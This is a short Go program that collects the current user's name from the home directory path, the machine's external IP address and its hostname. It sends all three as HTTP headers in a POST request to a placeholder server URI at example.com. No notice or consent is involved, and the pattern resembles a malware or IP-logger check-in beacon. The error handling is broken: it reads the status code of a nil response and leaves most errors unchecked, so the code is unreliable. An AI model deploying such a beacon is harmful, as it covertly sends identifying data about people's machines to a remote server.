package main

import (
	"fmt"
	"net/http"
	"os"
	"strings"

	externalip "github.com/glendc/go-external-ip"
)

func main() {
  // Set your server URI here
  hostserveruri := "https://example.com/api/server.php"

	// Get actual username
	name, err := os.UserHomeDir()
	if err != nil {
		name = ".\\.\\None"
	}

	// Get external IP
	splitN := strings.Split(name, "\\")
	consensus := externalip.DefaultConsensus(nil, nil)
	ip, err := consensus.ExternalIP()

	// Get Machine name (not user)
	machinename, err := os.Hostname()

	// Connection with the API
	client := &http.Client{}
	req, err := http.NewRequest("POST", hostserveruri, nil)

	req.Header.Add("x-ip", ip.String())
	req.Header.Add("x-name", splitN[2])
	req.Header.Add("x-mname", machinename)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(resp.StatusCode)
	}
}
